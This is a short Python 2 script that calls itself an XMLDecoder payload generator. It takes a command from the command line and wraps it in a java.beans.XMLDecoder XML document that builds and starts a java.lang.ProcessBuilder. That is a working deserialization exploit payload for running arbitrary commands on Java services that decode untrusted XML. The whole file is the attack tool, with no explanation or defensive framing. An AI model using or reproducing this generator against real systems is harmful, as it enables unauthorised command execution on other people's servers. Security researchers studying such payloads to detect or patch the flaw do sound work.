import argparse
parser = argparse.ArgumentParser(description='XMLDecoder payload generator')
parser.add_argument('-c', action="store", help="command line input", required=True)
fullstring = '''<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_111" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="$$$LENGTH_VAR$$$">
$$$COMMAND_PLACES$$$
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>'''
command = parser.parse_args().c
commands = command.split()
command_full = ""
command_counter = 0
for command1 in commands:
	if command_counter != 0:
		command_full += "\n"
	command_full += "      <void index=\"" + str(command_counter) + "\">\n        <string>" + command1 + "</string>\n      </void>"
	command_counter += 1
fullstring = fullstring.replace("$$$LENGTH_VAR$$$", str(command_counter))
fullstring = fullstring.replace("$$$COMMAND_PLACES$$$", command_full)
print fullstring

